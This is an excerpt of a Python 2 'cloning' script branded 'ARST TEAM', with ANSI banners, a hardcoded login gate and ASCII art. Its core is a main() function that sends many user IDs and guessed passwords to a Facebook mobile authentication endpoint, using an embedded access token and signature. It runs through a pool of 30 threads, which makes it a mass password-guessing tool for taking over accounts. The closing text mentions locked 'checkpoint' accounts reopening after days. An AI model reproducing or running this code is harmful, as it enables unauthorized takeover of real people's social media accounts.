...
\033[1;98m     ───── • ◆ • ────── • ◆ • ────── • ◆ • ─────
\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════¤═══¤═══¤═══║
\033[1;96m    ║✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗 𝕸𝖗.ARST                 ║    
\033[1;98m    ║✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 ARST TEAM  Creations            ║  
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev: ARST TEAM 
	    time.sleep(2)
            loop = 'false'
        else:
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		print "\033[1;97m•◈•══════•◈•\033[1;91mARST TEAM\033[1;97m•◈•══════•◈•"
		...
		print "\033[1;92m•◈•══════••◈•\033[1;91mARST TEAM\033[1;95m•◈•══════••◈•"
		try:
	...
	jalan('           \033[1;91mARST start cloning Wait...')
	print  "  \033[1;92m ●══════════════════◄►══════════════════●" 
	...
	def main(arg):
		...
		try:
			...
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedf65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
	...
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mARST TEAM\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By ARST TEAM --•◈•---»" #Dev:ARST TEAM
	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 NOW.1.py)↩\033[1;97m....'
...
_______¶¶¶_________¶______¶_________¶¶¶______
         ...
         Checkpoint ID Open After 7,8 Days
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ....ARST TEAM Creations....... \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;91m ARST TEAM"""
